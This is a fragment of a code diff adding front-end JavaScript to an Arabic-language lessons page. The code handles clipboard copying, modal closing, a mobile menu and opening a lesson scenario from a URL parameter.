+  navigator.clipboard.writeText(decodeURIComponent(enc)).then(function() {
+    btn.textContent = '✅';
+    setTimeout(function() { btn.textContent = '📋 نسخ'; }, 1500);
+  }).catch(function() {
+    const ta = document.createElement('textarea');
+    ta.value = decodeURIComponent(enc);
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+  });
+}
+
+function closeStepsModal(e) {
+  if (e.target === document.getElementById('stepsModal')) closeStepsModalDirect();
+}
+function closeStepsModalDirect() {
+  document.getElementById('stepsModal').style.display = 'none';
+  document.body.style.overflow = '';
+}
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeStepsModalDirect();
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+  const h = document.querySelector('.hamburger');
+  const m = document.querySelector('.mobile-menu');
+  if (h && m) h.addEventListener('click', function() {
+    h.classList.toggle('active');
+    m.classList.toggle('active');
+  });
+  
+  // دعم URL parameter ?lesson=ID للوصول المباشر
+  const params = new URLSearchParams(window.location.search);
+  const lessonId = params.get('lesson');
+  if (lessonId) {
+    const id = parseInt(lessonId);
+    // ابحث في كل السيناريوهات (SCENARIOS + LESSON_STEPS)
+    const scenario = getAllScenarios().find(s => s.id === id || s.lessonId === id);
+    if (scenario) {
+      setTimeout(() => openScenario(scenario.id), 300);
+    } else {
+      // إذا لم يوجد، أظهر رسالة
+      showLessonFromTutorials(id);
+    }
+  }
+});
+
+// عرض خطوات درس من tutorials.html إذا لم يكن في SCENARIOS
+function showLessonFromTutorials(lessonId) {
+  // نعرض رسالة إرشادية
+  const grid = document.getElementById('scenariosGrid');
+  const banner = document.createElement('div');
+  banner.style.cssText = 'grid-column:1/-1;background:rgba(0,255,65,0.07);border:1px solid rgba(0,255,65,0.25);border-radius:14px;padding:1.5rem;text-align:center;margin-bottom:1rem;';
+  banner.innerHTML = `
+    <div style="font-size:1.5rem;margin-bottom:0.5rem;">📚</div>
+    <h3 style="font-family:'Cairo',sans-serif;color:#00ff41;margin-bottom:0.5rem;">تم تحويلك من صفحة الدروس</h3>
+    <p style="color:var(--text-muted);font-size:0.85rem;font-family:'Cairo',sans-serif;">استعرض خطوات التنفيذ المتاحة أدناه أو العودة للدروس</p>
+    <a href="tutorials.html" style="display:inline-flex;align-items:center;gap:6px;margin-top:0.8rem;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.25);color:#00ff41;padding:6px 16px;border-radius:8px;font-family:'Cairo',sans-serif;font-size:0.82rem;text-decoration:none;">
+      <i class="fas fa-arrow-right"></i> العودة للدروس
+    </a>
+  `;
+  grid.insertBefore(banner, grid.firstChild);
+}
+
+renderScenarios();
+</script>
+</body>
+</html>
